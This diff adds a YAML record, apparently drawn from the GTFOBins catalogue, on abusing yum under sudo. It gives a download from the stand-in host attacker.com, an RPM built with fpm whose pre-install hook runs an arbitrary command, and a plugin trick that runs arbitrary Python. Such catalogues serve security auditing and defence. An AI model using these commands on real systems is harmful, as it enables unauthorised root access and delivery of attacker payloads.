@@ -1,0 +1,106 @@
+id: gtfobins/yum/download/sudo
+type: binary
+platform: linux
+name: yum
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: yum install http://attacker.com/path/to/input-file.rpm
+  comment: The file on the remote host must have the `.rpm` extension, but the content does not have to
+    be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`.
+references:
+- https://gtfobins.github.io/gtfobins/yum/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        yum:
+          functions:
+            command:
+            - code: yum localinstall -y x-1.0-1.noarch.rpm
+              comment: 'Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload
+                it to the target.
+
+
+                ```
+
+                echo /path/to/command >x.sh
+
+                fpm -n x -s dir -t rpm -a all --before-install .x.sh .
+
+                ```'
+              contexts:
+                sudo: null
+            download:
+            - code: yum install http://attacker.com/path/to/input-file.rpm
+              comment: The file on the remote host must have the `.rpm` extension, but the content does
+                not have to be an RPM file. The file will be downloaded to a randomly created directory
+                in `/var/tmp/yum-root-xxxxxx/`.
+              contexts:
+                sudo: null
+              sender: http-server
+            inherit:
+            - code: "cat >/path/to/temp-dir/x<<EOF\n[main]\nplugins=1\npluginpath=/path/to/temp-dir/\n\
+                pluginconfpath=/path/to/temp-dir/\nEOF\n\ncat >/path/to/temp-dir/y.conf<<EOF\n[main]\n\
+                enabled=1\nEOF\n\ncat >/path/to/temp-dir/y.py<<EOF\nimport yum\nfrom yum.plugins import\
+                \ PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n\
+                \  ...\nEOF\n\nyum -c /path/to/temp-dir/x --enableplugin=y"
+              comment: This allows to run Python code (`...`).
+              contexts:
+                sudo: null
+              from: python
+    upstream_url: https://gtfobins.github.io/gtfobins/yum/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:96ab46011ed5e1b8b3cb7daedabed29c4ec93aed076c5afeed9c9fce907ffee6
